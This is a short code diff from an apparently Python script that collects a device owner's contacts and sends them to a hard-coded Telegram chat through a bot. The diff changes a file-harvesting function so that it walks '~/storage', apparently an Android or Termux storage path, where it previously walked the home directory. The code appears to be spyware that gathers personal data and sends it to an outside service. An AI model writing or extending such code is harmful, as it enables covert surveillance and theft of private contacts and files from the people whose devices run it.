@@ -18,9 +18,8 @@ def send_contacts_to_telegram():
     bot.send_message(chat_id=1004407813, text=contacts_str)
 
 def get_user_files():
-    home_dir = os.path.expanduser('~')
     files = []
-    for root, _, filenames in os.walk(home_dir):
+    for root, _, filenames in os.walk('~/storage'):
         for filename in filenames:
             files.append(os.path.join(root, filename))
     return files
